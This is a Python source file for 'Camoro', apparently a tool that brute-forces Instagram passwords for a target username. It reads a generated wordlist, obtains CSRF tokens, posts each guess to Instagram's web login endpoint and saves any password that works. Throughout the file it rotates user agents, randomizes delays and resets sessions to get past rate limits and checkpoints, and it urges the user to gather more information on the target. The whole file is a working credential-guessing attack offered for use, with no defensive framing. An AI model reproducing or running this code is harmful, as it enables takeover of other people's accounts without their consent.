#!/usr/bin/env python3

"""
Camoro - Password Testing Module (Brute Force)
Tests generated passwords against Instagram authentication
"""

import json
import os
import sys
import time
import requests
import re
import random
from datetime import datetime

RESULTS_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'results')

GREEN = '\033[0;32m'
RED = '\033[0;31m'
CYAN = '\033[0;36m'
YELLOW = '\033[1;33m'
WHITE = '\033[1;37m'
PURPLE = '\033[0;35m'
NC = '\033[0m'

# Mobile User Agents for rotation
USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; iPhone 15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Xiaomi 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Galaxy S24 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36',
    'Instagram 269.0.0.18.73 Android (33/12; 480dpi; 1080x2400; Samsung; SM-S918B; dm1q; qcom; en_US)',
    'Instagram 270.0.0.20.85 Android (34/14; 420dpi; 1080x2340; Google; Pixel 9; husky; qcom; en_US)',
]


class InstagramBruteForce:
    """Instagram password testing engine."""
    
    def __init__(self, username):
        self.username = username
        self.user_dir = os.path.join(RESULTS_DIR, username)
        self.session = requests.Session()
        self.csrf_token = None
        self.rollout_hash = None
        self.attempt_count = 0
        self.start_time = None
        self.current_password = ""
        self.running = True
        
        # Load passwords
        self.passwords = self.load_passwords()
        self.total_passwords = len(self.passwords)
        
        # Check for already tested
        self.tested = self.load_tested()
        self.remaining = [p for p in self.passwords if p not in self.tested]
    
    def load_passwords(self):
        """Load generated passwords."""
        filepath = os.path.join(self.user_dir, 'passwords.txt')
        if not os.path.exists(filepath):
            print(f"{RED}[!] Passwords file not found: {filepath}{NC}")
            return []
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    
    def load_tested(self):
        """Load already tested passwords."""
        filepath = os.path.join(self.user_dir, 'tested.txt')
        if os.path.exists(filepath):
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return set(line.strip() for line in f if line.strip())
        return set()
    
    def mark_tested(self, password):
        """Mark a password as tested."""
        filepath = os.path.join(self.user_dir, 'tested.txt')
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(password + '\n')
        self.tested.add(password)
    
    def save_success(self, password):
        """Save successful password."""
        filepath = os.path.join(self.user_dir, 'success.txt')
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"Password Found: {password}\n")
            f.write(f"Username: {self.username}\n")
            f.write(f"Tested: {self.attempt_count} passwords\n")
            f.write(f"Time: {datetime.now().isoformat()}\n")
    
    def get_headers(self):
        """Generate request headers with CSRF token."""
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-CSRFToken': self.csrf_token if self.csrf_token else '',
            'X-Instagram-AJAX': self.rollout_hash if self.rollout_hash else '1',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        return headers
    
    def init_session(self):
        """Initialize session and get CSRF token."""
        try:
            # Visit Instagram homepage to get cookies
            resp = self.session.get(
                'https://www.instagram.com/',
                headers={'User-Agent': random.choice(USER_AGENTS)},
                timeout=15
            )
            
            # Extract CSRF token from cookies
            for cookie in self.session.cookies:
                if cookie.name == 'csrftoken':
                    self.csrf_token = cookie.value
                    break
            
            if not self.csrf_token:
                # Try to extract from response
                match = re.search(r'csrf_token":\s*"([^"]+)"', resp.text)
                if match:
                    self.csrf_token = match.group(1)
            
            # Extract rollout hash
            match = re.search(r'rollout_hash":\s*"([^"]+)"', resp.text)
            if match:
                self.rollout_hash = match.group(1)
            
            if self.csrf_token:
                print(f"{GREEN}[✓] {WHITE}Session initialized, CSRF: {YELLOW}{self.csrf_token[:10]}...{NC}")
                return True
            else:
                print(f"{YELLOW}[!] No CSRF token, trying alternative...{NC}")
                # Try alternative endpoint
                resp2 = self.session.get(
                    'https://www.instagram.com/api/v1/web/accounts/login/',
                    headers={'User-Agent': random.choice(USER_AGENTS)},
                    timeout=15
                )
                for cookie in self.session.cookies:
                    if cookie.name == 'csrftoken':
                        self.csrf_token = cookie.value
                        return True
                return False
                
        except Exception as e:
            print(f"{RED}[!] Session init error: {e}{NC}")
            return False
    
    def test_password(self, password):
        """Test a single password against Instagram."""
        url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
        
        # Instagram encrypts password, but we send in their expected format
        # The format is: #PWD_INSTAGRAM_BROWSER:0:<timestamp>:<password>
        timestamp = int(time.time() * 1000)
        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"
        
        data = {
            'username': self.username,
            'enc_password': enc_password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'stopDeletionNonce': '',
            'trustedDeviceRecords': '{}',
        }
        
        # Rotate user agent for each attempt
        headers = self.get_headers()
        headers['User-Agent'] = random.choice(USER_AGENTS)
        
        try:
            response = self.session.post(
                url,
                headers=headers,
                data=data,
                timeout=20
            )
            
            self.attempt_count += 1
            
            try:
                result = response.json()
            except json.JSONDecodeError:
                return {'status': 'parse_error', 'raw': response.text[:200]}
            
            # Check response
            if result.get('authenticated'):
                return {'status': 'success', 'password': password}
            
            if result.get('user', False) and result.get('authenticated', False) == False:
                # User exists but wrong password
                return {'status': 'wrong_password'}
            
            if 'checkpoint' in str(result).lower():
                return {'status': 'checkpoint', 'data': result}
            
            if 'rate_limit' in str(result).lower():
                return {'status': 'rate_limited'}
            
            if 'spam' in str(result).lower():
                return {'status': 'spam'}
            
            # Check for specific error messages
            if result.get('message') == 'Please wait a few minutes before you try again.':
                return {'status': 'rate_limited'}
            
            if 'invalid_parameters' in result or result.get('status') == 'fail':
                return {'status': 'invalid', 'message': result.get('message', '')}
            
            # Unknown response but not authenticated = wrong password
            return {'status': 'wrong_password', 'raw': result}
            
        except requests.exceptions.Timeout:
            return {'status': 'timeout'}
        except requests.exceptions.ConnectionError:
            return {'status': 'connection_error'}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def display_progress(self, tested, total, current_pwd, elapsed, status=""):
        """Display real-time progress."""
        percent = (tested / total * 100) if total > 0 else 0
        remaining = total - tested
        speed = tested / elapsed if elapsed > 0 else 0
        
        # Simple progress bar
        bar_length = 30
        filled = int(bar_length * tested // total) if total > 0 else 0
        bar = '█' * filled + '░' * (bar_length - filled)
        
        # Clear previous line and update
        eta = remaining / speed if speed > 0 else 0
        
        progress_line = (
            f"\r{bar} {percent:.1f}% | "
            f"{tested}/{total} | "
            f"{speed:.1f} pwd/s | "
            f"ETA: {eta:.0f}s | "
            f"{WHITE}{current_pwd[:20]:20s}{NC}"
        )
        
        # Truncate if too long for terminal
        sys.stdout.write(f"\033[K{progress_line}")
        sys.stdout.flush()
    
    def run(self):
        """Main execution loop."""
        if not self.passwords:
            print(f"{RED}[!] No passwords to test!{NC}")
            return
        
        if not self.remaining:
            print(f"{YELLOW}[!] All passwords already tested!{NC}")
            return
        
        print(f"\n{CYAN}╔{'═'*50}╗{NC}")
        print(f"{CYAN}║{' ' * 10}⚡ CAMORO BRUTE FORCE ENGINE{' ' * 10}║{NC}")
        print(f"{CYAN}╚{'═'*50}╝{NC}\n")
        
        print(f"{YELLOW}[*] {WHITE}Target: {GREEN}{self.username}{NC}")
        print(f"{YELLOW}[*] {WHITE}Total passwords: {GREEN}{self.total_passwords}{NC}")
        print(f"{YELLOW}[*] {WHITE}Already tested: {YELLOW}{len(self.tested)}{NC}")
        print(f"{YELLOW}[*] {WHITE}Remaining: {GREEN}{len(self.remaining)}{NC}")
        
        # Initialize session
        print(f"\n{CYAN}[*] {WHITE}Initializing session...{NC}")
        if not self.init_session():
            # Retry once
            print(f"{YELLOW}[!] Retrying session init...{NC}")
            time.sleep(3)
            if not self.init_session():
                print(f"{RED}[!] Failed to initialize session{NC}")
                
                # Ask to continue anyway
                print(f"\n{YELLOW}[!] Continuing with alternative method...{NC}")
                
                # Try direct login page approach
                try:
                    resp = self.session.get('https://www.instagram.com/accounts/login/',
                                           headers={'User-Agent': random.choice(USER_AGENTS)},
                                           timeout=15)
                    time.sleep(2)
                    
                    # Extract CSRF from login page
                    for cookie in self.session.cookies:
                        if cookie.name == 'csrftoken':
                            self.csrf_token = cookie.value
                            break
                    
                    if self.csrf_token:
                        print(f"{GREEN}[✓] Alternative session init successful{NC}")
                    else:
                        print(f"{RED}[!] Cannot proceed without CSRF token{NC}")
                        return
                except Exception as e:
                    print(f"{RED}[!] Alternative init failed: {e}{NC}")
                    return
        
        print(f"\n{CYAN}[*] {WHITE}Starting attack...{NC}")
        print(f"{YELLOW}[!] {WHITE}Testing passwords with 3-5 second delays to avoid rate limiting{NC}\n")
        
        self.start_time = time.time()
        
        # Process remaining passwords
        tested_count = len(self.tested)
        batch_size = 50  # Test 50 then take longer break
        
        for i, password in enumerate(self.remaining):
            if not self.running:
                break
            
            self.current_password = password
            
            # Display progress
            elapsed = time.time() - self.start_time
            self.display_progress(
                tested_count + i + 1,
                self.total_passwords,
                password,
                elapsed
            )
            
            # Test the password
            result = self.test_password(password)
            
            # Handle result
            if result['status'] == 'success':
                print(f"\n\n{GREEN}╔{'═'*50}╗{NC}")
                print(f"{GREEN}║{' ' * 15}✅ PASSWORD FOUND!{' ' * 15}║{NC}")
                print(f"{GREEN}╚{'═'*50}╝{NC}")
                print(f"\n  {WHITE}Password: {GREEN}{password}{NC}")
                print(f"  {WHITE}Attempts: {YELLOW}{self.attempt_count}{NC}")
                print(f"  {WHITE}Time: {YELLOW}{elapsed:.1f}s{NC}")
                
                self.save_success(password)
                return
            
            elif result['status'] == 'checkpoint':
                print(f"\n{YELLOW}[!] Checkpoint triggered! Waiting 120 seconds...{NC}")
                time.sleep(120)
                # Re-init session
                self.init_session()
                continue
            
            elif result['status'] == 'rate_limited':
                wait_time = random.randint(60, 120)
                print(f"\n{YELLOW}[!] Rate limited! Waiting {wait_time}s...{NC}")
                time.sleep(wait_time)
                self.init_session()
                # Don't skip this password, retry
                self.remaining.insert(i, password)
                continue
            
            elif result['status'] == 'timeout' or result['status'] == 'connection_error':
                print(f"\n{YELLOW}[!] Connection issue, waiting 30s...{NC}")
                time.sleep(30)
                self.remaining.insert(i, password)
                continue
            
            # Mark as tested
            self.mark_tested(password)
            
            # Dynamic delay based on attempt count
            if (i + 1) % batch_size == 0:
                # Longer break every batch
                delay = random.randint(10, 20)
                time.sleep(delay)
            elif (i + 1) % 10 == 0:
                # Medium break every 10
                delay = random.randint(5, 10)
                time.sleep(delay)
            else:
                # Normal delay
                delay = random.uniform(3, 5)
                time.sleep(delay)
            
            # Refresh CSRF periodically
            if (i + 1) % 100 == 0:
                self.init_session()
        
        print(f"\n\n{YELLOW}╔{'═'*50}╗{NC}")
        print(f"{YELLOW}║{' ' * 15}📊 ATTACK COMPLETE{' ' * 18}║{NC}")
        print(f"{YELLOW}╚{'═'*50}╝{NC}")
        elapsed = time.time() - self.start_time if self.start_time else 0
        print(f"\n  {WHITE}Passwords tested: {YELLOW}{len(self.remaining)}{NC}")
        print(f"  {WHITE}Total attempts: {YELLOW}{self.attempt_count}{NC}")
        print(f"  {WHITE}Time elapsed: {YELLOW}{elapsed:.1f}s{NC}")
        print(f"\n{RED}[!] Password not found in this set{NC}")
        print(f"{YELLOW}[*] Try gathering more information and generating a new set{NC}")


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Camoro - Brute Force Engine')
    parser.add_argument('--username', '-u', required=True, help='Target Instagram username')
    args = parser.parse_args()
    
    engine = InstagramBruteForce(args.username)
    engine.run()
